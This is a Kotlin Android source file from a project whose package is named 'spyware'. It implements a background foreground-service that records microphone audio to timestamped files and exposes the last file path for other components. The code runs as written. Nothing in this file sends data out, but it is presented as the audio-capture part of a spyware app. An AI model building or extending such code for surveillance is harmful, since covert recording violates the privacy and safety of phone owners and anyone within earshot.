package com.mhl.spyware

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.IOException

class AudioRecorder : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private var audioManager: AudioManager? = null
    private var isMicrophoneAvailable = true // Microphone availability flag

    companion object {
        var lastRecordedFileUri: String? = null
        private var isRecording = false
    }

    @SuppressLint("ForegroundServiceType")
    override fun onCreate() {
        super.onCreate()
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager

        checkMicrophoneAvailability() // Check if microphone is in use
        createNotificationChannel()
        startForeground(1, createNotification())

        try {
            if (isMicrophoneAvailable) {
                startRecording()
            } else {
                Log.e("AudioRecorderService", "Microphone is currently in use by another application.")
                stopSelf()
            }
        } catch (e: Exception) {
            Log.e("AudioRecorderService", "Error initializing recording: ${e.message}")
            e.printStackTrace()
            stopSelf()
        }
    }

    private fun checkMicrophoneAvailability() {

        isMicrophoneAvailable = audioManager?.isMicrophoneMute == false
        Log.d("AudioRecorderService", "Microphone availability: $isMicrophoneAvailable")
    }

    private fun startRecording() {
        val storageDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
            ?: filesDir // Fallback to internal storage if external is not available

        if (!storageDir.exists()) {
            if (!storageDir.mkdirs()) {
                Log.e("AudioRecorderService", "Failed to create storage directory")
                stopSelf()
                return
            }
        }

        audioFile = File(storageDir, "audio_${System.currentTimeMillis()}.3gp")
        Log.d("AudioRecorderService", "Audio file path: ${audioFile?.absolutePath}")

        try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile?.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            lastRecordedFileUri = audioFile?.absolutePath
            Log.d("AudioRecorderService", "Recording started. File: ${lastRecordedFileUri}")
        } catch (e: IllegalStateException) {
            Log.e("AudioRecorderService", "IllegalStateException during recording: ${e.message}")
            e.printStackTrace()
            stopSelf()
        } catch (e: IOException) {
            Log.e("AudioRecorderService", "IOException during recording: ${e.message}")
            e.printStackTrace()
            stopSelf()
        } catch (e: Exception) {
            Log.e("AudioRecorderService", "Recording failed: ${e.message}")
            e.printStackTrace()
            stopSelf()
        }
    }

    private fun stopRecordingAndService() {
        if (isRecording) {
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false

                if (audioFile?.exists() == true && (audioFile?.length() ?: 0) > 0) {
                    lastRecordedFileUri = audioFile?.absolutePath
                    Log.d("AudioRecorderService", "Recording stopped successfully. File: ${lastRecordedFileUri}")
                } else {
                    Log.e("AudioRecorderService", "File doesn't exist or is empty")
                }
            } catch (e: RuntimeException) {
                Log.e("AudioRecorderService", "RuntimeException while stopping recording: ${e.message}")
                e.printStackTrace()
            } catch (e: Exception) {
                Log.e("AudioRecorderService", "Error stopping recording: ${e.message}")
                e.printStackTrace()
            }
        }
        stopForeground(true)
        stopSelf()
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "audio_service_channel")
            .setContentTitle("Audio Recorder")
            .setContentText("Recording audio in the background.")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "audio_service_channel",
            "Audio Recorder Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    override fun onDestroy() {
        try {
            stopRecordingAndService()
        } catch (e: Exception) {
            Log.e("AudioRecorderService", "Error during service destruction: ${e.message}")
            e.printStackTrace()
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}